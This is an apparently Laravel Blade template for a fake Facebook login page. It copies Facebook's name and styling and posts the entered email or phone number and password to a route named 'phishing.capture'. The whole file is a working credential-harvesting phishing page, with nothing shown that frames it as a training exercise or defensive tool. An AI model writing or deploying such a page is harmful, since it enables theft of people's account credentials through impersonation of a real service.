<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Facebook Login</title>
        <style>
            body { font-family: Arial, sans-serif; background: #f0f2f5; text-align: center; }
            .container { width: 300px; margin: auto; margin-top: 100px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ccc; border-radius: 5px; }
            button { width: 100%; background: #1877f2; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
            button:hover { background: #166fe5; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Facebook</h2>
            <form action="{{route('phishing.capture')}}" method="POST">
                @csrf
                <input type="text" name="email" placeholder="Email or Phone Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
</html>
